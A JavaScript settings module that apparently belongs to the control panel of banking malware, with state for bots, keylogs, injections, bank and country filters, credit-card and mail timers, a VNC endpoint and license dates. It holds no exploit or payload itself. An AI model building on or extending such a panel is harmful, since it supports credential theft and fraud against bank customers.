let SettingsContext = {
    version: "0.0.1",
    isLoaded: false,
    SelectedBots: [],
    InfoBots: [],
    CountBots: 0,
    RowsPerPage: 5,
    CurrentPage: 0, 
    user: null,
    password: '',

    CountLogs: 0,
    RowsPerPageLogs: 100,
    CurrentPageLogs: 0,

    CountKeyLogs: 0,
    RowsPerPageKeyLogs: 100,
    CurrentPageKeyLogs: 0,

    CountUsers: 0,
    RowsPerPageUsers: 100,
    CurrentPageUsers: 0,

    CountInjections: 0,
    RowsPerPageInjections: 100,
    CurrentPageInjections: 0,
    Injections: [],
    
    LicenseEnd: new Date('2030-09-26'),
    LicenseStart: new Date('2023-10-10'),

    BotsFilterMode: '000000000000',
    FindbyCountry: '',
    FindByID: '',
    FindByBank: '',
    timeInject: 10,
    timeCC: 20,
    timeMail: 30,
    pushTitle: '',
    pushText: '',
    restApiUrl: '',
    vncApiUrl: '',
    licensedays: 0,
    autoUpdateDelay: 10000,
    autoUpdateEnable: true,
    SaveSettingsCookies() {
        Cookies.set('autoUpdateTimeout', this.autoUpdateDelay);
        Cookies.set('BotsFilterMode', this.BotsFilterMode);
        Cookies.set('restApiUrl', this.restApiUrl);
    },

}

export default SettingsContext;
